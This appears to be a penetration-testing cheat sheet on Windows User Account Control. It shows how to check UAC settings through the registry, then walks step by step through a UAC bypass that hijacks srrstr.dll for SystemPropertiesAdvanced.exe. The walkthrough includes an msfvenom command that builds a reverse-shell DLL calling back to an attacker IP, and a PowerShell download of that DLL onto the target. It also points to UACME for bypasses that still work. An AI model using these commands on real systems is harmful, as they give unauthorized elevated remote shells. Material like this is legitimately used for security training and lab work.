# User Account Control 

UAC is a features enabling a consent prompt for elevated activities.

[UACME](https://github.com/hfiref0x/UACME) references a ton of UAC bypasses.

## Checking UAC 

Checking if UAC is enabled :
```powershell
PS C:\> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    EnableLUA    REG_DWORD    0x1
```

Checking UAC level : 
```powershell
PS C:\> reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
    ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
Here, it is `0x5`, which means the highest UAC level of `Always Notify` is enabled. Fewer UAC bypasses work at this level

## Example UAC Bypass by DLL Hijacking

We will use a technique described in [this blog post](https://egre55.github.io/system-properties-uac-bypass/). It's number 54 in [UACME](https://github.com/hfiref0x/UACME).<br>
It works by DLL Hijacking a auto-elevating binary. <br>
Precisely, we will hijack the non existent `srrstr.dll`, needed by `SystemPropertiesAdvanced.exe` which is auto-elevating, like other SystemProperties binaries.

> This specific technique has been patched in Windows 10 19H1 (18362). 
> There are plenty of others that still work tho, check out UACME


We should first generate a malicious dll using msfvenom :
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.133 LPORT=8443 -f dll -o srrstr.dll
```
Then, start your listener and a http server to download the malicious dll on the target, and download it where SystemPropertiesAdvanced.exe will look for it, in \AppData\Local\Microsoft\WindowsApps\
```powershell
Invoke-WebRequest -Uri "http://10.10.14.133/srrstr.dll" -OutFile "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

> You can test your dll using `rundll32 shell32.dll,Control_RunDLL <PATH TO DLL>`

After that, just execute the SystemPropertiesAdvanced.exe binary, you should receive an elevated shell showing all the privileges available :D

